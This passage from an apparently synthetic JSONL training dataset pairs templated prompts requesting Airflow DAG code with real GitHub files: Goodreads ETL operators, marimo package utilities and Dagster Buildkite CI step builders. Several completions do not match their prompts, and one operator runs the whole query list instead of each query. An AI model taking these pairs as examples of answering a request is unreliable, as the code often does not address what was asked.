warehouse_data_quality_checks >> create_analytics_schema\ncreate_analytics_schema >> [create_author_analytics_table, create_book_analytics_table]\ncreate_author_analytics_table >> [load_author_table_reviews, load_author_table_ratings, load_best_author] >> authors_data_quality_checks\ncreate_book_analytics_table >> [load_book_table_reviews, load_book_table_ratings, load_best_book] >> books_data_quality_checks\n[authors_data_quality_checks, books_data_quality_checks] >> end_operator\n", "metadata": {"source": "github.com/san089/goodreads_etl_pipeline", "file_path": "airflow/dags/goodreads_etl_dag.py", "language": "python", "complexity": "medium", "star_count": 1399, "quality_score": 0.69, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.plugins_manager import AirflowPlugin\n\nimport operators\nimport helpers\n\n# Defining the plugin class\nclass GoodReadsPlugin(AirflowPlugin):\n    name = \"goodreads_plugin\"\n    operators = [\n        operators.DataQualityOperator,\n        helpers.LoadAnalyticsOperator\n    ]\n\n", "metadata": {"source": "github.com/san089/goodreads_etl_pipeline", "file_path": "airflow/plugins/__init__.py", "language": "python", "complexity": "simple", "star_count": 1399, "quality_score": 0.69, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.models import BaseOperator\nfrom airflow.utils.decorators import apply_defaults\n\n\nclass DataQualityOperator(BaseOperator):\n\n    ui_color = '#89DA59'\n\n    @apply_defaults\n    def __init__(self,\n                 redshift_conn_id=\"\",\n                 tables = [],\n                 *args, **kwargs):\n\n        super(DataQualityOperator, self).__init__(*args, **kwargs)\n        self.redshift_conn_id = redshift_conn_id\n        self.tables = tables\n\n    def execute(self, context):\n        redshift_hook = PostgresHook(postgres_conn_id = self.redshift_conn_id)\n\n        for table in self.tables:\n\n            self.log.info(\"Starting data quality validation on table : {}\".format(table))\n            records = redshift_hook.get_records(\"select count(*) from {};\".format(table))\n\n            if len(records) < 1 or len(records[0]) < 1 or records[0][0] < 1:\n                self.log.error(\"Data Quality validation failed for table : {}.\".format(table))\n                raise ValueError(\"Data Quality validation failed for table : {}\".format(table))\n            self.log.info(\"Data Quality Validation Passed on table : {}!!!\".format(table))\n", "metadata": {"source": "github.com/san089/goodreads_etl_pipeline", "file_path": "airflow/plugins/operators/data_quality.py", "language": "python", "complexity": "simple", "star_count": 1399, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.hooks.postgres_hook import PostgresHook\nfrom airflow.models import BaseOperator\nfrom airflow.utils.decorators import apply_defaults\n\n\nclass LoadAnalyticsOperator(BaseOperator):\n    ui_color = '#80BD9E'\n\n    @apply_defaults\n    def __init__(self,\n                 redshift_conn_id=\"\",\n                 sql_query=[],\n                 *args, **kwargs):\n        super(LoadAnalyticsOperator, self).__init__(*args, **kwargs)\n        self.redshift_conn_id = redshift_conn_id\n        self.sql_query = sql_query\n\n    def execute(self, context):\n        redshift_hook = PostgresHook(postgres_conn_id=self.redshift_conn_id)\n        for query in self.sql_query:\n            self.log.info(\"Running Analytics query :  {}\".format(query))\n            redshift_hook.run(self.sql_query)\n            self.log.info(\"Query ran successfully!!\")\n", "metadata": {"source": "github.com/san089/goodreads_etl_pipeline", "file_path": "airflow/plugins/operators/goodreads_analytics.py", "language": "python", "complexity": "simple", "star_count": 1399, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2024 Marimo. All rights reserved.\nfrom __future__ import annotations\n\nimport dataclasses\nimport os\nimport re\nimport sys\nfrom typing import Optional\n\nfrom marimo._utils.platform import is_pyodide\n\n\ndef in_virtual_environment() -> bool:\n    \"\"\"Returns True if a venv/virtualenv is activated\"\"\"\n    # https://stackoverflow.com/questions/1871549/how-to-determine-if-python-is-running-inside-a-virtualenv/40099080#40099080  # noqa: E501\n    base_prefix = (\n        getattr(sys, \"base_prefix\", None)\n        or getattr(sys, \"real_prefix\", None)\n        or sys.prefix\n    )\n    return sys.prefix != base_prefix\n\n\ndef in_conda_env() -> bool:\n    return \"CONDA_DEFAULT_ENV\" in os.environ\n\n\ndef is_dockerized() -> bool:\n    return os.path.exists(\"/.dockerenv\")\n\n\ndef is_modal_image() -> bool:\n    return os.environ.get(\"MODAL_TASK_ID\") is not None\n\n\ndef is_python_isolated() -> bool:\n    \"\"\"Returns True if not using system Python\"\"\"\n    return (\n        in_virtual_environment()\n        or in_conda_env()\n        or is_pyodide()\n        or is_dockerized()\n        or is_modal_image()\n    )\n\n\ndef append_version(pkg_name: str, version: Optional[str]) -> str:\n    \"\"\"Qualify a version string with a leading '==' if it doesn't have one\"\"\"\n    if version is None:\n        return pkg_name\n    if version == \"\":\n        return pkg_name\n    if version == \"latest\":\n        return pkg_name\n    return f\"{pkg_name}=={version}\"\n\n\ndef split_packages(package: str) -> list[str]:\n    \"\"\"\n    Splits a package string into a list of packages.\n\n    This can handle editable packages (i.e. local directories)\n\n    e.g.\n    \"package1[extra1,extra2]==1.0.0\" -> [\"package1[extra1,extra2]==1.0.0\"]\n    \"package1 package2\" -> [\"package1\", \"package2\"]\n    \"package1==1.0.0 package2==2.0.0\" -> [\"package1==1.0.0\", \"package2==2.0.0\"]\n    \"package1 -e /path/to/package1\" -> [\"package1 -e /path/to/package1\"]\n    \"package1 --editable /path/to/package1\" -> [\"package1 --editable /path/to/package1\"]\n    \"package1 -e /path/to/package1 package2\" -> [\"package1 -e /path/to/package1\", \"package2\"]\n    \"package1 @ /path/to/package1\" -> [\"package1 @ /path/to/package1\"]\n    \"foo==1.0; python_version>'3.6' bar==2.0; sys_platform=='win32'\" -> [\"foo==1.0; python_version>'3.6'\", \"bar==2.0; sys_platform=='win32'\"]\n    \"\"\"  # noqa: E501\n    packages: list[str] = []\n    current_package: list[str] = []\n    in_environment_marker = False\n\n    for part in package.split():\n        if part in [\"-e\", \"--editable\", \"@\"]:\n            current_package.append(part)\n        elif current_package and current_package[-1] in [\n            \"-e\",\n            \"--editable\",\n            \"@\",\n        ]:\n            current_package.append(part)\n        elif part.endswith(\";\"):\n            if current_package:\n                packages.append(\" \".join(current_package))\n                current_package = []\n            in_environment_marker = True\n            current_package.append(part)\n        elif in_environment_marker:\n            current_package.append(part)\n            if part.endswith(\"'\") or part.endswith('\"'):\n                in_environment_marker = False\n                packages.append(\" \".join(current_package))\n                current_package = []\n        else:\n            if current_package:\n                packages.append(\" \".join(current_package))\n            current_package = [part]\n\n    if current_package:\n        packages.append(\" \".join(current_package))\n\n    return [pkg.strip() for pkg in packages]\n\n\n@dataclasses.dataclass\nclass PackageRequirement:\n    \"\"\"A package requirement with name and optional extras.\"\"\"\n\n    name: str\n    extras: set[str] = dataclasses.field(default_factory=set)\n\n    @classmethod\n    def parse(cls, requirement: str) -> PackageRequirement:\n        \"\"\"Parse a package requirement string into name and extras.\"\"\"\n        match = re.match(r\"^([^\\[\\]]+)(?:\\[([^\\[\\]]+)\\])?$\", requirement)\n        if not match:\n            return cls(name=requirement)\n        name = match.group(1)\n        extras = set(match.group(2).split(\",\")) if match.group(2) else set()\n        return cls(name=name, extras=extras)\n\n    def __str__(self) -> str:\n        \"\"\"Convert back to a package requirement string.\"\"\"\n        if not self.extras:\n            return self.name\n        return f\"{self.name}[{','.join(sorted(self.extras))}]\"\n", "metadata": {"source": "github.com/marimo-team/marimo", "file_path": "marimo/_runtime/packages/utils.py", "language": "python", "complexity": "medium", "star_count": 14776, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\nfrom typing import Callable, List, Optional, Union\n\nfrom dagster_buildkite.defines import (\n    GCP_CREDS_FILENAME,\n    GCP_CREDS_LOCAL_FILE,\n    LATEST_DAGSTER_RELEASE,\n)\nfrom dagster_buildkite.git import ChangedFiles\nfrom dagster_buildkite.package_spec import (\n    PackageSpec,\n    PytestExtraCommandsFunction,\n    UnsupportedVersionsFunction,\n)\nfrom buildkite_shared.python_version import AvailablePythonVersion\nfrom buildkite_shared.step_builders.step_builder import (\n    StepConfiguration,\n    TopLevelStepConfiguration,\n)\nfrom buildkite_shared.step_builders.command_step_builder import BuildkiteQueue\nfrom dagster_buildkite.steps.test_project import test_project_depends_fn\nfrom dagster_buildkite.utils import (\n    connect_sibling_docker_container,\n    has_helm_changes,\n    library_version_from_core_version,\n    network_buildkite_container,\n)\n\nSCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))\nDAGSTER_CURRENT_BRANCH = \"current_branch\"\nEARLIEST_TESTED_RELEASE = \"0.12.8\"\n\n\ndef build_integration_steps() -> List[StepConfiguration]:\n    steps: List[StepConfiguration] = []\n\n    # Shared dependency of some test suites\n    steps += PackageSpec(\n        os.path.join(\"integration_tests\", \"python_modules\", \"dagster-k8s-test-infra\"),\n    ).build_steps()\n\n    # test suites\n    steps += build_backcompat_suite_steps()\n    steps += build_celery_k8s_suite_steps()\n    steps += build_k8s_suite_steps()\n    steps += build_daemon_suite_steps()\n    steps += build_auto_materialize_perf_suite_steps()\n    steps += build_azure_live_test_suite_steps()\n\n    return steps\n\n\n# ########################\n# ##### BACKCOMPAT\n# ########################\n\n\ndef build_backcompat_suite_steps() -> List[TopLevelStepConfiguration]:\n    tox_factors = [\n        \"user-code-latest-release\",\n        \"user-code-earliest-release\",\n    ]\n\n    return build_integration_suite_steps(\n        os.path.join(\"integration_tests\", \"test_suites\", \"backcompat-test-suite\"),\n        pytest_extra_cmds=backcompat_extra_cmds,\n        pytest_tox_factors=tox_factors,\n    )\n\n\ndef backcompat_extra_cmds(_, factor: Optional[str]) -> List[str]:\n    tox_factor_map = {\n        \"user-code-latest-release\": LATEST_DAGSTER_RELEASE,\n        \"user-code-earliest-release\": EARLIEST_TESTED_RELEASE,\n    }\n    assert factor\n    webserver_version = DAGSTER_CURRENT_BRANCH\n    webserver_library_version = _get_library_version(webserver_version)\n    user_code_version = tox_factor_map[factor]\n    user_code_library_version = _get_library_version(user_code_version)\n    user_code_definitions_file = _infer_user_code_definitions_files(user_code_version)\n\n    return [\n        f\"export EARLIEST_TESTED_RELEASE={EARLIEST_TESTED_RELEASE}\",\n        f\"export USER_CODE_DEFINITIONS_FILE={user_code_definitions_file}\",\n        \"pushd integration_tests/test_suites/backcompat-test-suite/webserver_service\",\n        \" \".join(\n            [\n                \"./build.sh\",\n                webserver_version,\n                webserver_library_version,\n                user_code_version,\n                user_code_library_version,\n                user_code_definitions_file,\n            ]\n        ),\n        \"docker-compose up -d --remove-orphans\",  # clean up in hooks/pre-exit\n        *network_buildkite_container(\"webserver_service_network\"),\n        *connect_sibling_docker_container(\n            \"webserver_service_network\",\n            \"dagster_webserver\",\n            \"BACKCOMPAT_TESTS_WEBSERVER_HOST\",\n        ),\n        \"popd\",\n    ]\n\n\ndef _infer_user_code_definitions_files(user_code_release: str) -> str:\n    \"\"\"Returns the definitions file to use for the user code release.\"\"\"\n    if user_code_release == EARLIEST_TESTED_RELEASE:\n        return \"defs_for_earliest_tested_release.py\"\n    else:\n        return \"defs_for_latest_release.py\"\n\n\ndef _get_library_version(version: str) -> str:\n    if version == DAGSTER_CURRENT_BRANCH:\n        return DAGSTER_CURRENT_BRANCH\n    else:\n        return library_version_from_core_version(version)\n\n\n# ########################\n# ##### CELERY K8S\n# ########################\n\n\ndef build_celery_k8s_suite_steps() -> List[TopLevelStepConfiguration]:\n    pytest_tox_factors = [\n        \"-default\",\n        \"-markredis\",\n    ]\n    directory = os.path.join(\n        \"integration_tests\", \"test_suites\", \"celery-k8s-test-suite\"\n    )\n    return build_integration_suite_steps(\n        directory,\n        pytest_tox_factors,\n        queue=BuildkiteQueue.DOCKER,  # crashes on python 3.11/3.12 without additional resources\n        always_run_if=has_helm_changes,\n        pytest_extra_cmds=celery_k8s_integration_suite_pytest_extra_cmds,\n    )\n\n\n# ########################\n# ##### DAEMON\n# ########################\n\n\ndef build_daemon_suite_steps():\n    pytest_tox_factors = None\n    directory = os.path.join(\"integration_tests\", \"test_suites\", \"daemon-test-suite\")\n    return build_integration_suite_steps(\n        directory,\n        pytest_tox_factors,\n        pytest_extra_cmds=daemon_pytest_extra_cmds,\n    )\n\n\ndef build_auto_materialize_perf_suite_steps():\n    pytest_tox_factors = None\n    directory = os.path.join(\n        \"integration_tests\", \"test_suites\", \"auto_materialize_perf_tests\"\n    )\n    return build_integration_suite_steps(\n        directory,\n        pytest_tox_factors,\n        unsupported_python_versions=[\n            version\n            for version in AvailablePythonVersion.get_all()\n            if version != AvailablePythonVersion.V3_11\n        ],\n    )\n\n\ndef skip_if_not_azure_commit():\n    \"\"\"If no dagster-azure files are changed, skip the azure live tests.\"\"\"\n    return (\n        None\n        if (any(\"dagster-azure\" in str(path) for path in ChangedFiles.all))\n        else \"Not a dagster-azure commit\"\n    )\n\n\ndef skip_if_not_gcp_commit():\n    \"\"\"If no dagster-gcp files are changed, skip the gcp live tests.\"\"\"\n    return (\n        None\n        if (any(\"dagster-gcp\" in str(path) for path in ChangedFiles.all))\n        else \"Not a dagster-gcp commit\"\n    )\n\n\ndef build_azure_live_test_suite_steps() -> List[TopLevelStepConfiguration]:\n    return PackageSpec(\n        os.path.join(\"integration_tests\", \"test_suites\", \"dagster-azure-live-tests\"),\n        skip_if=skip_if_not_azure_commit,\n        env_vars=[\n            \"TEST_AZURE_TENANT_ID\",\n            \"TEST_AZURE_CLIENT_ID\",\n            \"TEST_AZURE_CLIENT_SECRET\",\n            \"TEST_AZURE_STORAGE_ACCOUNT_ID\",\n            \"TEST_AZURE_CONTAINER_ID\",\n            \"TEST_AZURE_ACCESS_KEY\",\n        ],\n    ).build_steps()\n\n\ndef daemon_pytest_extra_cmds(version: AvailablePythonVersion, _):\n    return [\n        \"export DAGSTER_DOCKER_IMAGE_TAG=$${BUILDKITE_BUILD_ID}-\" + version.value,\n        'export DAGSTER_DOCKER_REPOSITORY=\"$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com\"',\n    ]\n\n\n# ########################\n# ##### K8S\n# ########################\n\n\ndef build_k8s_suite_steps() -> List[TopLevelStepConfiguration]:\n    pytest_tox_factors = [\n        \"-default\",\n        \"-subchart\",\n        \"-default_monitoring\",\n        \"-subchart_monitoring\",\n    ]\n    directory = os.path.join(\"integration_tests\", \"test_suites\", \"k8s-test-suite\")\n    return build_integration_suite_steps(\n        directory,\n        pytest_tox_factors,\n        always_run_if=has_helm_changes,\n        pytest_extra_cmds=k8s_integration_suite_pytest_extra_cmds,\n        queue=BuildkiteQueue.DOCKER,\n    )\n\n\n# ########################\n# ##### UTILITIES\n# ########################\n\n\ndef build_integration_suite_steps(\n    directory: str,\n    pytest_tox_factors: Optional[List[str]],\n    pytest_extra_cmds: Optional[PytestExtraCommandsFunction] = None,\n    queue=None,\n    always_run_if: Optional[Callable[[], bool]] = None,\n    unsupported_python_versions: Optional[\n        Union[List[AvailablePythonVersion], UnsupportedVersionsFunction]\n    ] = None,\n) -> List[TopLevelStepConfiguration]:\n    return PackageSpec(\n        directory,\n        env_vars=[\n            \"AIRFLOW_HOME\",\n            \"AWS_ACCOUNT_ID\",\n            \"AWS_ACCESS_KEY_ID\",\n            \"AWS_SECRET_ACCESS_KEY\",\n            \"BUILDKITE_SECRETS_BUCKET\",\n            \"GOOGLE_APPLICATION_CREDENTIALS\",\n        ],\n        pytest_extra_cmds=pytest_extra_cmds,\n        pytest_step_dependencies=test_project_depends_fn,\n        pytest_tox_factors=pytest_tox_factors,\n        retries=2,\n        timeout_in_minutes=30,\n        queue=queue,\n        always_run_if=always_run_if,\n        unsupported_python_versions=unsupported_python_versions,\n    ).build_steps()\n\n\ndef k8s_integration_suite_pytest_extra_cmds(\n    version: AvailablePythonVersion, _\n) -> List[str]:\n    return [\n        \"export DAGSTER_DOCKER_IMAGE_TAG=$${BUILDKITE_BUILD_ID}-\" + version.value,\n        'export DAGSTER_DOCKER_REPOSITORY=\"$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com\"',\n        \"aws ecr get-login --no-include-email --region us-west-2 | sh\",\n    ]\n\n\ndef celery_k8s_integration_suite_pytest_extra_cmds(\n    version: AvailablePythonVersion, _\n) -> List[str]:\n    cmds = [\n        'export AIRFLOW_HOME=\"/airflow\"',\n        \"mkdir -p $${AIRFLOW_HOME}\",\n        \"export DAGSTER_DOCKER_IMAGE_TAG=$${BUILDKITE_BUILD_ID}-\" + version.value,\n        'export DAGSTER_DOCKER_REPOSITORY=\"$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com\"',\n        \"aws ecr get-login --no-include-email --region us-west-2 | sh\",\n    ]\n\n    # If integration tests are disabled, we won't have any gcp credentials to download.\n    if not os.getenv(\"CI_DISABLE_INTEGRATION_TESTS\"):\n        cmds += [\n            rf\"aws s3 cp s3://\\${{BUILDKITE_SECRETS_BUCKET}}/{GCP_CREDS_FILENAME} \"\n            + GCP_CREDS_LOCAL_FILE,\n            \"export GOOGLE_APPLICATION_CREDENTIALS=\" + GCP_CREDS_LOCAL_FILE,\n        ]\n\n    cmds += [\n        \"pushd python_modules/libraries/dagster-celery\",\n        # Run the rabbitmq db. We are in docker running docker\n        # so this will be a sibling container.\n        \"docker-compose up -d --remove-orphans\",  # clean up in hooks/pre-exit,\n        # Can't use host networking on buildkite and communicate via localhost\n        # between these sibling containers, so pass along the ip.\n        *network_buildkite_container(\"rabbitmq\"),\n        *connect_sibling_docker_container(\n            \"rabbitmq\", \"test-rabbitmq\", \"DAGSTER_CELERY_BROKER_HOST\"\n        ),\n        \"popd\",\n    ]\n\n    return cmds\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": ".buildkite/dagster-buildkite/dagster_buildkite/steps/integration.py", "language": "python", "complexity": "complex", "star_count": 13638, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\nfrom glob import glob\nfrom pathlib import Path\nfrom typing import Iterable, List, Optional\n\nfrom dagster_buildkite.defines import (\n    GCP_CREDS_FILENAME,\n    GCP_CREDS_LOCAL_FILE,\n    GIT_REPO_ROOT,\n)\nfrom dagster_buildkite.package_spec import PackageSpec\nfrom buildkite_shared.python_version import AvailablePythonVersion\nfrom buildkite_shared.step_builders.command_step_builder import BuildkiteQueue\nfrom buildkite_shared.step_builders.step_builder import StepConfiguration\nfrom dagster_buildkite.steps.test_project import test_project_depends_fn\nfrom dagster_buildkite.utils import (\n    connect_sibling_docker_container,\n    has_dagster_airlift_changes,\n    has_dg_changes,\n    has_storage_test_fixture_changes,\n    network_buildkite_container,\n    skip_if_not_dagster_dbt_cloud_commit,\n)\n\n\ndef build_example_packages_steps() -> List[StepConfiguration]:\n    custom_example_pkg_roots = [\n        pkg.directory for pkg in EXAMPLE_PACKAGES_WITH_CUSTOM_CONFIG\n    ]\n    example_packages_with_standard_config = [\n        PackageSpec(pkg)\n        for pkg in (\n            _get_uncustomized_pkg_roots(\"examples\", custom_example_pkg_roots)\n            + _get_uncustomized_pkg_roots(\n                \"examples/experimental\", custom_example_pkg_roots\n            )\n        )\n        if pkg not in (\"examples/deploy_ecs\", \"examples/starlift-demo\")\n    ]\n\n    example_packages = (\n        EXAMPLE_PACKAGES_WITH_CUSTOM_CONFIG + example_packages_with_standard_config\n    )\n\n    return build_steps_from_package_specs(example_packages)\n\n\ndef build_library_packages_steps() -> List[StepConfiguration]:\n    custom_library_pkg_roots = [\n        pkg.directory for pkg in LIBRARY_PACKAGES_WITH_CUSTOM_CONFIG\n    ]\n    library_packages_with_standard_config = [\n        *[\n            PackageSpec(pkg)\n            for pkg in _get_uncustomized_pkg_roots(\n                \"python_modules\", custom_library_pkg_roots\n            )\n        ],\n        *[\n            PackageSpec(pkg)\n            for pkg in _get_uncustomized_pkg_roots(\n                \"python_modules/libraries\", custom_library_pkg_roots\n            )\n        ],\n    ]\n\n    return build_steps_from_package_specs(\n        LIBRARY_PACKAGES_WITH_CUSTOM_CONFIG + library_packages_with_standard_config\n    )\n\n\ndef build_steps_from_package_specs(\n    package_specs: List[PackageSpec],\n) -> List[StepConfiguration]:\n    steps: List[StepConfiguration] = []\n    all_packages = sorted(\n        package_specs,\n        key=lambda p: f\"{_PACKAGE_TYPE_ORDER.index(p.package_type)} {p.name}\",  # type: ignore[arg-type]\n    )\n\n    for pkg in all_packages:\n        steps += pkg.build_steps()\n\n    return steps\n\n\n_PACKAGE_TYPE_ORDER = [\"core\", \"extension\", \"example\", \"infrastructure\", \"unknown\"]\n\n\n# Find packages under a root subdirectory that are not configured above.\ndef _get_uncustomized_pkg_roots(root: str, custom_pkg_roots: List[str]) -> List[str]:\n    all_files_in_root = [\n        os.path.relpath(p, GIT_REPO_ROOT)\n        for p in glob(os.path.join(GIT_REPO_ROOT, root, \"*\"))\n    ]\n    return [\n        p\n        for p in all_files_in_root\n        if p not in custom_pkg_roots and os.path.exists(f\"{p}/tox.ini\")\n    ]\n\n\n# ########################\n# ##### PACKAGES WITH CUSTOM STEPS\n# ########################\n\n\ndef airflow_extra_cmds(version: AvailablePythonVersion, _) -> List[str]:\n    return [\n        'export AIRFLOW_HOME=\"/airflow\"',\n        \"mkdir -p $${AIRFLOW_HOME}\",\n    ]\n\n\nairline_demo_extra_cmds = [\n    \"pushd examples/airline_demo\",\n    # Run the postgres db. We are in docker running docker\n    # so this will be a sibling container.\n    \"docker-compose up -d --remove-orphans\",  # clean up in hooks/pre-exit\n    # Can't use host networking on buildkite and communicate via localhost\n    # between these sibling containers, so pass along the ip.\n    *network_buildkite_container(\"postgres\"),\n    *connect_sibling_docker_container(\n        \"postgres\", \"test-postgres-db-airline\", \"POSTGRES_TEST_DB_HOST\"\n    ),\n    \"popd\",\n]\n\n\ndef dagster_graphql_extra_cmds(_, tox_factor: Optional[str]) -> List[str]:\n    if tox_factor and tox_factor.startswith(\"postgres\"):\n        return [\n            \"pushd python_modules/dagster-graphql/dagster_graphql_tests/graphql/\",\n            \"docker-compose up -d --remove-orphans\",  # clean up in hooks/pre-exit,\n            # Can't use host networking on buildkite and communicate via localhost\n            # between these sibling containers, so pass along the ip.\n            *network_buildkite_container(\"postgres\"),\n            *connect_sibling_docker_container(\n                \"postgres\", \"test-postgres-db-graphql\", \"POSTGRES_TEST_DB_HOST\"\n            ),\n            \"popd\",\n        ]\n    else:\n        return []\n\n\ndeploy_docker_example_extra_cmds = [\n    \"pushd examples/deploy_docker/from_source\",\n    \"./build.sh\",\n    \"docker-compose up -d --remove-orphans\",  # clean up in hooks/pre-exit\n    *network_buildkite_container(\"docker_example_network\"),\n    *connect_sibling_docker_container(\n        \"docker_example_network\",\n        \"docker_example_webserver\",\n        \"DEPLOY_DOCKER_WEBSERVER_HOST\",\n    ),\n    \"popd\",\n]\n\n\ndef celery_extra_cmds(version: AvailablePythonVersion, _) -> List[str]:\n    return [\n        \"export DAGSTER_DOCKER_IMAGE_TAG=$${BUILDKITE_BUILD_ID}-\" + version.value,\n        'export DAGSTER_DOCKER_REPOSITORY=\"$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com\"',\n        \"pushd python_modules/libraries/dagster-celery\",\n        # Run the rabbitmq db. We are in docker running docker\n        # so this will be a sibling container.\n        \"docker-compose up -d --remove-orphans\",  # clean up in hooks/pre-exit,\n        # Can't use host networking on buildkite and communicate via localhost\n        # between these sibling containers, so pass along the ip.\n        *network_buildkite_container(\"rabbitmq\"),\n        *connect_sibling_docker_container(\n            \"rabbitmq\", \"test-rabbitmq\", \"DAGSTER_CELERY_BROKER_HOST\"\n        ),\n        \"popd\",\n    ]\n\n\ndef docker_extra_cmds(version: AvailablePythonVersion, _) -> List[str]:\n    return [\n        \"export DAGSTER_DOCKER_IMAGE_TAG=$${BUILDKITE_BUILD_ID}-\" + version.value,\n        'export DAGSTER_DOCKER_REPOSITORY=\"$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com\"',\n    ]\n\n\nui_extra_cmds = [\"make rebuild_ui\"]\n\n\nmysql_extra_cmds = [\n    \"pushd python_modules/libraries/dagster-mysql/dagster_mysql_tests/\",\n    \"docker-compose up -d --remove-orphans\",  # clean up in hooks/pre-exit,\n    *network_buildkite_container(\"mysql\"),\n    *network_buildkite_container(\"mysql_pinned\"),\n    *network_buildkite_container(\"mysql_pinned_backcompat\"),\n    *connect_sibling_docker_container(\"mysql\", \"test-mysql-db\", \"MYSQL_TEST_DB_HOST\"),\n    *connect_sibling_docker_container(\n        \"mysql_pinned\", \"test-mysql-db-pinned\", \"MYSQL_TEST_PINNED_DB_HOST\"\n    ),\n    *connect_sibling_docker_container(\n        \"mysql_pinned_backcompat\",\n        \"test-mysql-db-pinned-backcompat\",\n        \"MYSQL_TEST_PINNED_BACKCOMPAT_DB_HOST\",\n    ),\n    \"popd\",\n]\n\n\ndef k8s_extra_cmds(version: AvailablePythonVersion, _) -> List[str]:\n    return [\n        \"export DAGSTER_DOCKER_IMAGE_TAG=$${BUILDKITE_BUILD_ID}-\" + version.value,\n        'export DAGSTER_DOCKER_REPOSITORY=\"$${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com\"',\n    ]\n\n\ngcp_creds_extra_cmds = (\n    [\n        rf\"aws s3 cp s3://\\${{BUILDKITE_SECRETS_BUCKET}}/{GCP_CREDS_FILENAME} \"\n        + GCP_CREDS_LOCAL_FILE,\n        \"export GOOGLE_APPLICATION_CREDENTIALS=\" + GCP_CREDS_LOCAL_FILE,\n    ]\n    if not os.getenv(\"CI_DISABLE_INTEGRATION_TESTS\")\n    else []\n)\n\n\n# Some Dagster packages have more involved test configs or support only certain Python version;\n# special-case those here\nEXAMPLE_PACKAGES_WITH_CUSTOM_CONFIG: List[PackageSpec] = [\n    PackageSpec(\n        \"examples/assets_smoke_test\",\n    ),\n    PackageSpec(\n        \"examples/deploy_docker\",\n        pytest_extra_cmds=deploy_docker_example_extra_cmds,\n    ),\n    PackageSpec(\n        \"examples/docs_snippets\",\n        # The docs_snippets test suite also installs a ton of packages in the same environment,\n        # which is liable to cause dependency collisions. It's not necessary to test all these\n        # snippets in all python versions since we are testing the core code exercised by the\n        # snippets against all supported python versions.\n        unsupported_python_versions=AvailablePythonVersion.get_all_except_default(),\n        pytest_tox_factors=[\n            \"all\",\n            \"integrations\",\n            \"docs_snapshot_test\",\n        ],\n        always_run_if=has_dg_changes,\n    ),\n    PackageSpec(\n        \"examples/project_fully_featured\",\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_12,  # duckdb\n            AvailablePythonVersion.V3_13,  # duckdb\n        ],\n    ),\n    PackageSpec(\n        \"examples/with_great_expectations\",\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_9,\n        ],\n    ),\n    PackageSpec(\n        \"examples/with_pyspark\",\n    ),\n    PackageSpec(\n        \"examples/with_pyspark_emr\",\n    ),\n    PackageSpec(\n        \"examples/with_wandb\",\n        unsupported_python_versions=[\n            # dagster-wandb dep\n            AvailablePythonVersion.V3_12,\n            AvailablePythonVersion.V3_13,\n        ],\n    ),\n    # The 6 tutorials referenced in cloud onboarding cant test \"source\" due to dagster-cloud dep\n    PackageSpec(\n        \"examples/assets_modern_data_stack\",\n        pytest_tox_factors=[\"pypi\"],\n    ),\n    PackageSpec(\n        \"examples/assets_dbt_python\",\n        pytest_tox_factors=[\"pypi\"],\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_12,  # duckdb\n            AvailablePythonVersion.V3_13,  # duckdb\n        ],\n    ),\n    PackageSpec(\n        \"examples/assets_dynamic_partitions\",\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_12,  # duckdb\n            AvailablePythonVersion.V3_13,  # duckdb\n        ],\n    ),\n    PackageSpec(\n        \"examples/quickstart_aws\",\n        pytest_tox_factors=[\"pypi\"],\n        # TODO - re-enable once new version of `dagster-cloud` is available on pypi\n        unsupported_python_versions=[\n            AvailablePythonVersion.V3_13,\n        ],\n    ),\n    PackageSpec(\n        \"examples/quickstart_etl\",\n        pytest_tox_factors=[\"pypi\"],\n    ),\n    PackageSpec(\n        \"examples/quickstart_gcp\",\n        